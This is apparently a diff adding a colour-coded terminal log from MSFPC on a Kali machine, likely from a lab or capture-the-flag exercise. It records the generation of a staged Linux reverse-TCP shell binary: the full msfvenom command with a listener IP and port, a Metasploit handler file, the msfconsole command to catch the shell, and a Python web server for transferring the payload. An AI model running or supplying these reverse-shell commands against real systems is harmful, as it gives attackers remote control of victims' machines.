@@ -1,0 +1,15 @@
+ [01;34m[*][00m [01;34mMSF[00mvenom [01;34mP[00mayload [01;34mC[00mreator ([01;34mMSFPC[00m v[01;34m1.4.5[00m)
+ [01;33m[i][00m   IP: [01;33m10.10.14.54[00m
+ [01;33m[i][00m PORT: [01;33m4444[00m
+ [01;33m[i][00m TYPE: [01;33mlinux[00m (linux/x86/shell/reverse_tcp)
+ [01;33m[i][00m  CMD: [01;01mmsfvenom -p linux/x86/shell/reverse_tcp -f elf \
+  --platform linux -a x86 -e generic/none LHOST=10.10.14.54 LPORT=4444 \
+  > '/home/kali/Tools/linux-shell-staged-reverse-tcp-4444.elf'[00m
+
+ [01;33m[i][00m File (/home/kali/Tools/linux-shell-staged-reverse-tcp-4444.elf) [01;33malready exists[00m. [01;33mOverwriting...[00m
+ [01;33m[i][00m linux shell created: '[01;33m/home/kali/Tools/linux-shell-staged-reverse-tcp-4444.elf[00m'
+
+ [01;33m[i][00m MSF handler file: '/home/kali/Tools/linux-shell-staged-reverse-tcp-4444-elf.rc'
+ [01;33m[i][00m Run: msfconsole -q -r '/home/kali/Tools/linux-shell-staged-reverse-tcp-4444-elf.rc'
+ [01;32m[?][00m [01;32mQuick web server[00m (for file transfer)?: python2 -m SimpleHTTPServer 8080
+ [01;34m[*][00m [01;34mDone[00m!
